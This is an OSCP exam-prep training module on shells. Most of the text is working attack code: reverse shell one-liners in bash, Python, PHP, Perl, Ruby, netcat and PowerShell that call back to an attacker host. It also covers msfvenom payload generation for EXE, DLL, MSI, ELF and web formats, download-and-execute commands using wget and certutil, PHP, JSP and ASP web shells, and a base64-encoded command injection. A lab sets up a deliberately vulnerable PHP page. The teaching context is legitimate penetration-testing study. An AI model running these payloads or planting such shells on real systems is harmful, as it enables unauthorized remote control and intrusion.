# 08 — Shells: Reverse, Bind, Web, and Upgrades

Every exploitation path ends the same way: you need a shell on the target. This module covers every method of getting and improving shells. You'll use these techniques on EVERY machine in the exam.

---

## Understanding Shell Types

### Reverse shell — "Target connects back to you"

The target initiates the connection. Your Kali machine listens and waits.

```
Kali (listener) ← ── ── ── ── Target (connects out to you)
     port 4444                 executes the reverse shell payload
```

**When to use:** Almost always. This is your default. Firewalls typically block inbound connections to the target but allow outbound connections from it. A reverse shell uses that outbound path.

### Bind shell — "Target listens, you connect to it"

The target opens a port and waits. You connect to it from Kali.

```
Kali (connects to target) ── ── ── →  Target (listener)
                                       port 4444
```

**When to use:** When the target can't reach your Kali (no outbound connectivity), but you can reach the target's ports. Less common than reverse shells because firewalls usually block inbound connections to random ports.

### Web shell — "Execute commands through HTTP"

A script on the web server that takes commands via URL parameters and executes them. Not a real interactive shell — you send one command per HTTP request.

```
Kali: curl "http://TARGET/shell.php?cmd=whoami"
Target: executes whoami, returns the output in the HTTP response
```

**When to use:** When you have file upload or file write access to a web server. Often the first step before upgrading to a full reverse shell.

---

## Setting Up Listeners

Before sending any shell payload, you need something to catch it.

### netcat listener (simple, always works)

```bash
nc -lvnp 4444
```

| Flag | What it does |
|---|---|
| `-l` | Listen mode (wait for incoming connections) |
| `-v` | Verbose (show connection info) |
| `-n` | No DNS lookup (faster) |
| `-p 4444` | Listen on port 4444 |

**When the shell connects, you'll see:**
```
Connection received on 192.168.244.132 54321
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
www-data@target:/$
```

That ugly output means it worked. You have a shell. It's not pretty (no prompt, no tab completion, Ctrl+C kills it), but it works.

### rlwrap — add history and arrow keys to nc

```bash
# Install
sudo apt install rlwrap -y

# Use it
rlwrap nc -lvnp 4444
```

rlwrap wraps nc with readline support — you get command history (up arrow) and line editing. Small quality-of-life improvement.

### Metasploit multi/handler (most feature-rich)

```bash
msfconsole -q

msf6> use exploit/multi/handler
msf6> set PAYLOAD linux/x64/shell_reverse_tcp
msf6> set LHOST 192.168.244.129
msf6> set LPORT 4444
msf6> run
```

**Why use this over nc:**
- Can catch Meterpreter shells (nc can't)
- Session management (background sessions, switch between them)
- Can upgrade basic shells to Meterpreter
- Handles staged payloads (nc only handles stageless)

**Remember:** `multi/handler` is **exempt** from the OSCP one-Metasploit-target rule. You can use it to catch shells from ANY target.

### When to use which listener

| Listener | Use when |
|---|---|
| `nc -lvnp` | Quick and simple, catching basic reverse shells |
| `rlwrap nc -lvnp` | Same but you want command history |
| `multi/handler` | Catching MSFVenom payloads, Meterpreter, or staged shells |
| `socat` | Need a fully interactive TTY from the start |
| `pwncat` | Want auto-upgrade and post-exploitation features built in |

---

## Reverse Shell Payloads — By Language

The target needs software installed to execute your payload. Try the language that's most likely to exist on the target.

### Bash (Linux — almost always available)

```bash
bash -i >& /dev/tcp/KALI_IP/4444 0>&1
```

**Breaking this down piece by piece:**

```
bash -i          Start an interactive bash shell
>&               Redirect stdout AND stderr
/dev/tcp/IP/PORT Linux special file that creates a TCP connection
0>&1             Redirect stdin to the same place as stdout
```

The whole thing says: "Start bash, send all output through a TCP connection to Kali, and read all input from that same connection."

**Alternative bash methods (when the first doesn't work):**

```bash
# Method 2: Using exec
bash -c 'exec bash -i &>/dev/tcp/KALI_IP/4444 <&1'

# Method 3: Using sh instead of bash
sh -i >& /dev/tcp/KALI_IP/4444 0>&1

# Method 4: Named pipe
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc KALI_IP 4444 > /tmp/f
```

The named pipe method works when `/dev/tcp` isn't available (some systems don't have it). It creates a pipe file, feeds it to bash, and sends bash's output through netcat.

### Python (Linux + Windows)

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**What this does step by step:**

```python
import socket,subprocess,os       # Import required modules
s=socket.socket(...)               # Create a TCP socket
s.connect(("KALI_IP",4444))       # Connect to your Kali
os.dup2(s.fileno(),0)             # Redirect stdin to the socket
os.dup2(s.fileno(),1)             # Redirect stdout to the socket
os.dup2(s.fileno(),2)             # Redirect stderr to the socket
subprocess.call(["/bin/bash","-i"]) # Start bash — its I/O now goes through the socket
```

**Python for Windows (use cmd.exe instead of bash):**

```python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["cmd.exe"])'
```

### PHP (web servers)

```bash
php -r '$sock=fsockopen("KALI_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

Or as a one-liner you can inject through a web vulnerability:

```bash
php -r '$sock=fsockopen("KALI_IP",4444);$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

### Perl

```bash
perl -e 'use Socket;$i="KALI_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("KALI_IP",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat (if installed on target)

```bash
# If nc has -e flag (traditional netcat)
nc -e /bin/bash KALI_IP 4444

# If nc doesn't have -e (OpenBSD netcat — common on modern Linux)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc KALI_IP 4444 > /tmp/f
```

### PowerShell (Windows)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('KALI_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

This is long and ugly. For command injection through a URL, base64 encode it:

```bash
# Create the PowerShell payload
echo 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('"'"'KALI_IP'"'"',4444)..."' | base64

# Inject the encoded version
powershell -enc BASE64_STRING_HERE
```

### Which language to try

```
Linux target:
  1. Bash  (almost always available)
  2. Python (very common, especially on modern systems)
  3. nc    (usually available)
  4. Perl  (common on older systems)
  5. PHP   (only if PHP is installed — web servers)

Windows target:
  1. PowerShell (always available on modern Windows)
  2. Python (if installed)
  3. cmd + certutil to download and run an exe payload
```

---

## MSFVenom Payloads — Pre-built Binaries

MSFVenom generates standalone payload files that you deliver to the target and execute.

### Linux payloads

```bash
# Basic reverse shell (ELF binary)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf

# Meterpreter reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f elf -o meterpreter.elf

# Staged (smaller, needs multi/handler)
msfvenom -p linux/x64/shell/reverse_tcp LHOST=KALI_IP LPORT=4444 -f elf -o staged.elf

# Stageless (bigger, works with nc listener)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f elf -o stageless.elf
```

### Windows payloads

```bash
# Basic reverse shell (EXE)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o shell.exe

# Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o meterpreter.exe

# DLL (for DLL hijacking privesc)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f dll -o evil.dll

# MSI (for AlwaysInstallElevated privesc)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f msi -o evil.msi
```

### Web payloads

```bash
# PHP
msfvenom -p php/reverse_php LHOST=KALI_IP LPORT=4444 -f raw -o shell.php
# Add <?php at the start if the output doesn't have it

# JSP (Java web servers — Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat manager upload)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f war -o shell.war

# ASP (IIS)
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f asp -o shell.asp

# ASPX (IIS .NET)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f aspx -o shell.aspx
```

### Staged vs stageless — understanding the difference

**Stageless (`shell_reverse_tcp` with underscore):**
```
The ENTIRE payload is in one file.
Target executes it → connects to your listener → shell.

Pros: Works with a basic nc listener. One file, one connection.
Cons: Bigger file size. Easier for AV to detect (entire payload is there).
```

**Staged (`shell/reverse_tcp` with slash):**
```
Only a tiny "stager" is in the file.
Target executes stager → connects to your listener → downloads the full payload → shell.

Pros: Smaller initial file. Harder for AV (the payload isn't in the file).
Cons: REQUIRES multi/handler (nc can't send the second stage). Needs a stable connection.
```

**How to tell them apart:**
```
windows/x64/shell_reverse_tcp        Stageless (underscore)
windows/x64/shell/reverse_tcp        Staged (slash)
windows/x64/meterpreter_reverse_tcp  Stageless Meterpreter
windows/x64/meterpreter/reverse_tcp  Staged Meterpreter
```

**For the OSCP exam:**
- Use **stageless** payloads when catching with `nc` (most of the time)
- Use **staged** payloads only when catching with `multi/handler` (your one Metasploit target)
- Meterpreter always needs `multi/handler` regardless of staged/stageless

### Delivery methods

Once you generate a payload, you need to get it onto the target:

```bash
# Serve it from Kali
python3 -m http.server 80

# Download on Linux target
wget http://KALI_IP/shell.elf
chmod +x shell.elf
./shell.elf

# Or
curl http://KALI_IP/shell.elf -o shell.elf
chmod +x shell.elf
./shell.elf

# Download on Windows target
certutil -urlcache -f http://KALI_IP/shell.exe shell.exe
.\shell.exe

# Or PowerShell
Invoke-WebRequest http://KALI_IP/shell.exe -OutFile shell.exe
.\shell.exe

# Through a web shell
curl "http://TARGET/webshell.php?cmd=wget%20http://KALI_IP/shell.elf%20-O%20/tmp/shell.elf"
curl "http://TARGET/webshell.php?cmd=chmod%20+x%20/tmp/shell.elf"
curl "http://TARGET/webshell.php?cmd=/tmp/shell.elf"
```

---

## Web Shells

A web shell is a script uploaded to a web server that executes OS commands through HTTP requests.

### Simple PHP web shell

```php
<?php system($_GET["cmd"]); ?>
```

Save as `shell.php`, upload to the target's web root, access via:

```bash
curl "http://TARGET/uploads/shell.php?cmd=whoami"
curl "http://TARGET/uploads/shell.php?cmd=id"
curl "http://TARGET/uploads/shell.php?cmd=cat+/etc/passwd"
```

### More capable PHP web shell

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
```

This version:
- Uses `$_REQUEST` instead of `$_GET` — works with both GET and POST requests
- Wraps output in `<pre>` tags for formatted display
- Uses `shell_exec` which returns the full output as a string

### JSP web shell (Java/Tomcat)

```jsp
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    java.io.InputStream is = p.getInputStream();
    int c;
    while ((c = is.read()) != -1) out.print((char)c);
}
%>
```

### ASP web shell (Windows IIS)

```asp
<%
Dim cmd
cmd = Request("cmd")
Set shell = Server.CreateObject("WScript.Shell")
Set exec = shell.Exec("cmd /c " & cmd)
Response.Write(exec.StdOut.ReadAll())
%>
```

### Upgrading from web shell to reverse shell

A web shell is limited — one command per request, no interactivity, no tab completion. Upgrade to a reverse shell as soon as possible:

```bash
# On Kali: start listener
nc -lvnp 4444

# Through the web shell: trigger a reverse shell
curl "http://TARGET/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/KALI_IP/4444+0>%261'"

# If that doesn't work, try the Python version
curl "http://TARGET/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect((\"KALI_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

# If spaces cause issues, use ${IFS}
curl "http://TARGET/shell.php?cmd=bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>%26${IFS}/dev/tcp/KALI_IP/4444${IFS}0>%261'"
```

---

## Shell Stabilization — The Most Important Skill

A raw reverse shell is terrible to work with:
- No tab completion
- No command history (up arrow doesn't work)
- Ctrl+C kills the shell (instead of canceling a command)
- No clear screen
- Some commands won't work (like `su`, `sudo` with password, `ssh`)
- Output formatting is broken

**Stabilizing the shell** fixes all of this. Do it IMMEDIATELY after catching a shell.

### Method 1: Python PTY + stty (the standard method)

**Step 1: Spawn a PTY (pseudo-terminal)**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This gives you a proper terminal. You now have a prompt and some basic functionality. But Ctrl+C still kills the shell. Fix that:

**Step 2: Background the shell and fix your terminal**

```bash
# Press Ctrl+Z to background the shell
^Z
[1]+  Stopped

# Fix your terminal settings
stty raw -echo; fg
```

`stty raw -echo` puts your terminal in raw mode (passes every keystroke directly to the remote shell without local interpretation). `fg` brings the shell back to the foreground.

**Step 3: Set environment variables**

```bash
export TERM=xterm
export SHELL=bash
```

**Step 4: Fix the terminal size**

On Kali (in a DIFFERENT terminal), check your terminal size:
```bash
stty size
# Output: 40 120 (rows columns)
```

In your shell:
```bash
stty rows 40 cols 120
```

Now you have full tab completion, command history, Ctrl+C works properly, `clear` clears the screen, and interactive commands like `vi`, `su`, and `ssh` work correctly.

### The full sequence in one block (memorize this)

```bash
# In the shell you just caught:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm SHELL=bash
stty rows 40 cols 120
```

**Practice this until it's muscle memory.** You will do this on every single machine.

### Method 2: Using script (when python isn't available)

```bash
script -qc /bin/bash /dev/null
# Then Ctrl+Z, stty raw -echo; fg, etc. (same as above)
```

### Method 3: socat (fully interactive from the start)

socat gives you a fully interactive TTY without the manual upgrade process.

**On Kali (listener):**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On target:**
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:KALI_IP:4444
```

If socat isn't on the target, upload a static binary:
```bash
# On Kali
python3 -m http.server 80

# On target (from your basic shell)
wget http://KALI_IP/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:KALI_IP:4444
```

### What if python ISN'T available?

```bash
# Check what's available
which python python3 python2 perl ruby lua node php
```

**Alternatives to python3 -c 'import pty...':**

```bash
# Python 2
python -c 'import pty; pty.spawn("/bin/bash")'

# Perl
perl -e 'exec "/bin/bash";'

# Using script command
script -qc /bin/bash /dev/null

# Using expect
expect -c 'spawn bash; interact'

# Just /bin/bash (gives you a prompt but not a PTY)
/bin/bash -i
```

---

## Bind Shells

Less common than reverse shells but important to understand.

### Setting up a bind shell on the target

**netcat bind shell:**
```bash
# On the target (listener)
nc -lvnp 4444 -e /bin/bash

# From Kali (connect to it)
nc TARGET 4444
```

**Without -e flag:**
```bash
# On the target
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f

# From Kali
nc TARGET 4444
```

### MSFVenom bind shell

```bash
# Generate
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf

# Execute on target
chmod +x bind.elf
./bind.elf

# Connect from Kali
nc TARGET 4444
```

### When to use bind shells

```
Reverse shell: TARGET → connects outbound → KALI (listener)
  Use when: target can reach you (most situations)

Bind shell:   KALI → connects inbound → TARGET (listener)
  Use when: target can't reach you, but you can reach the target
  Problem: firewalls usually block inbound connections to random ports
```

---

## Shell Through Command Injection (URL encoding)

When injecting through a web parameter, special characters need URL encoding:

| Character | URL encoded |
|---|---|
| Space | `%20` or `+` |
| `&` | `%26` |
| `;` | `%3B` |
| `\|` | `%7C` |
| `>` | `%3E` |
| `<` | `%3C` |
| `'` | `%27` |
| `"` | `%22` |
| `/` | `%2F` |
| `\n` (newline) | `%0A` |

### The base64 trick (avoids all encoding issues)

When URL encoding gets messy (nested quotes, special characters), base64 encode the entire payload:

```bash
# Step 1: Create the payload
echo "bash -i >& /dev/tcp/192.168.244.129/4444 0>&1" | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0NC4xMjkvNDQ0NCAwPiYxCg==

# Step 2: Inject the encoded version
curl "http://TARGET/vuln.php?cmd=echo+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0NC4xMjkvNDQ0NCAwPiYxCg==|base64+-d|bash"
```

The target decodes the base64 and pipes it to bash. No special characters in the URL to worry about.

---

## Troubleshooting Shells

### Shell connects but immediately dies

```
Problem: Shell connects to your listener then disconnects
Causes:
  - Firewall on target killing outbound connections
  - The process spawning the shell exits (web request completes)
  - AV killing the payload

Fix: Try a different port (443, 80, 8080 — often allowed through firewalls)
Fix: Use a staged payload with multi/handler
Fix: Try a different payload language
```

### Can't get a shell at all

```
Problem: No connection arrives at your listener
Causes:
  - Firewall blocking outbound on your chosen port
  - Wrong KALI_IP in the payload
  - Payload syntax error
  - Target doesn't have the required interpreter

Fix: Verify your IP: ip a | grep inet
Fix: Try ports 80, 443, 8080 (commonly allowed outbound)
Fix: Try different languages (bash, python, php, perl)
Fix: Test with a simple ping first: ping KALI_IP (watch with tcpdump)
```

### Shell connects but no output

```
Problem: Shell connects, you see "Connection received" but typing commands shows nothing
Causes:
  - stdout isn't redirected properly
  - The shell payload is incomplete

Fix: Make sure your payload redirects all three streams (stdin, stdout, stderr)
Fix: Try: bash -i >& /dev/tcp/IP/PORT 0>&1 (the >& handles stdout+stderr)
```

### Testing connectivity before shell attempts

```bash
# On Kali: watch for ICMP
sudo tcpdump -i eth0 icmp

# Through the command injection: send a ping
curl "http://TARGET/vuln.php?cmd=ping+-c+2+KALI_IP"

# If you see the ping in tcpdump, the target CAN reach you
# If you don't, there's a firewall between you
```

---

## Lab: Practice Every Shell Type

### On your Debian VM — set up a command injection page

```bash
cat << 'PHPEOF' | sudo tee /var/www/html/vuln.php
<?php
if(isset($_GET['cmd'])){
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
PHPEOF
sudo systemctl restart apache2
```

### From Kali — practice each shell type

```bash
# Terminal 1: start listener
nc -lvnp 4444

# Terminal 2: trigger bash reverse shell
curl "http://DEBIAN_IP/vuln.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/KALI_IP/4444+0>%261'"

# Terminal 1: you should have a shell
# Practice the upgrade:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm SHELL=bash

# Exit and try again with Python
# Terminal 1: nc -lvnp 4444
# Terminal 2: inject python reverse shell

# Exit and try MSFVenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f elf -o /tmp/shell.elf
# Serve it
cd /tmp && python3 -m http.server 80
# Download and execute through the web shell
curl "http://DEBIAN_IP/vuln.php?cmd=wget+http://KALI_IP/shell.elf+-O+/tmp/shell.elf"
curl "http://DEBIAN_IP/vuln.php?cmd=chmod+%2Bx+/tmp/shell.elf"
curl "http://DEBIAN_IP/vuln.php?cmd=/tmp/shell.elf"
```

**Do this until the process is automatic.** On the exam, you should be able to go from command execution to a stable, upgraded shell in under 2 minutes.

---

## Exam Tips for Shells

1. **Always try port 443 if port 4444 doesn't connect.** Many firewalls allow outbound HTTPS (443) but block random ports.

2. **Keep a cheatsheet of reverse shell commands.** Use revshells.com to generate payloads for any language and port combination.

3. **Stabilize immediately.** The python PTY + stty upgrade should be muscle memory. Don't try to work in an unstable shell — you'll waste time fighting the terminal instead of hacking the target.

4. **If one language doesn't work, try another.** bash failed? Try python. Python not installed? Try perl. Try them all before giving up.

5. **Use multi/handler for your Metasploit target.** It catches Meterpreter, which is the best shell for post-exploitation. For all other targets, nc is fine.

6. **Test connectivity first.** Before sending complex shell payloads, verify the target can reach your Kali with a simple `ping` command through the injection.

7. **Base64 encode when injection is messy.** Special characters in URLs cause problems. Base64 encoding the payload avoids all of them.
